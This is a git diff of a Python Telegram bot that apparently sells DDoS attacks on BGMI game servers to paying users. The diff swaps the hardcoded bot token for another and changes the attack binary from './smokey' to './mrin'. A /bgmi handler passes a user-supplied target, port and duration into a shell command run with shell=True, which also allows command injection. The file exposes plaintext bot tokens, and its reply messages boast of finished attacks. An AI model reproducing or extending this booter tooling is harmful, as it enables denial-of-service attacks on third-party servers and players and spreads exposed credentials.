@@ -7,7 +7,7 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('6583151106:AAEckYcrco3qa9gCQ5UxXKQuF5QL4-Ys8YY')
+bot = telebot.TeleBot('7633435652:AAFT6uodtFKq1xi3EGfFYjGpgecGc66MgAE')
 
 # Admin user IDs
 admin_id = ["5193826370"]
@@ -246,7 +246,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./smokey {target} {port} {time} 1200"
+                full_command = f"./mrin {target} {port} {time} 1200"
                 subprocess.run(full_command, shell=True)
                 response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩 AND TO @spyther"
         else:
